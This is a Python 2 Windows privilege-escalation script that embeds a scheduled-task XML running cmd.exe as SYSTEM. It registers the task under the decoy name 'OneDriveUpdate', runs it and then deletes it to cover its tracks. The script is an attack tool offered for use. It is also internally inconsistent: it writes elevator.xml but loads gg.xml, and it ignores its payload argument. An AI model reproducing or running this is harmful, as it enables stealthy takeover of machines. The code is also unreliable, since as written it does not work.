"""
Works from: Windows 7
Fixed in: Unfixed
"""
import os
import wmi
import tempfile
import win32con
import ctypes
import datetime
from colorama import init, Fore
init(convert=True)

elevate_system = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2018-05-15T13:44:06.4916243</Date>
    <Author>OneDriveUpdate</Author>
    <URI>\Microsoft\Windows\OneDriveUpdate</URI>
  </RegistrationInfo>
  <Triggers/>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
	  <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>c:\\windows\\system32\\cmd.exe</Command>
    </Exec>
  </Actions>
</Task>"""

def print_success(message):
	print (Fore.GREEN + " [+] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)

def print_error(message):
	print (Fore.RED + " [+] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)

def print_info(message):
	print (Fore.CYAN + " [!] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)
	
def print_warning(message):
	print (Fore.YELLOW + " [!] " + Fore.RESET + str(datetime.datetime.now()) + ": " + message)

def schtask_elevate(payload):
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		try:
			file = open(os.path.join(tempfile.gettempdir(),"elevator.xml"),"w")
			file.write(elevate_system)
			file.close()
		except Exception as error:
			return False
	
	try:
		x = os.popen("schtasks /create /xml {} /tn OneDriveUpdate && schtasks /run /tn OneDriveUpdate && schtasks /delete /tn OneDriveUpdate /f".format(os.path.join(tempfile.gettempdir(),"gg.xml")))
		print x.read()
	except Exception as error:
		return False
	
	try:
		os.remove(os.path.join(tempfile.gettempdir(),"elevator.xml"))
	except Exception as error:
		return False
		
schtask_elevate("c:\\windows\\system32\\mspaint.exe")			